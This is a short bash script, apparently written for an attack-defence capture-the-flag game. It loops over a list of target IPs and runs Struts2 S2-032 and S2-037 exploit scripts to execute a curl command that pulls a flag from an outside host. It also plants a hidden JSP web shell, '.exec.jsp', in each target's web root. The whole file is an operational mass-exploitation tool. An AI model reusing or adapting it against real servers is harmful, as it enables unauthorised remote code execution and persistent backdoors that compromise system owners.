#!/bin/bash

iplist_file='./iplist.txt'
getflag='curl -s http://172.16.80.1:8000/flag.txt'

if [ ! -f $iplist_file ]; then
    echo "iplist.txt not exist!"
    exit
fi

#get flag by s2-032
cat $iplist_file | while read line
do
    python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action -c "$getflag"
done

#get flag by s2-037
cat $iplist_file | while read line
do
    python /Users/hancool/pentest/web/struts2/S2-037_CmdToolExP.py -u http://$line:8080/struts2-rest-showcase/orders/3 -command "$getflag"
done

#upload exec.jsp by s2-032
cat $iplist_file | while read line
do
   python /Users/hancool/pentest/web/struts2-032/s2-032.py -u http://$line:8080/struts2-showcase/index.action --upload --remote_file ../ROOT/.exec.jsp --local_file /Users/hancool/pentest/web/struts2-032/exec.jsp
done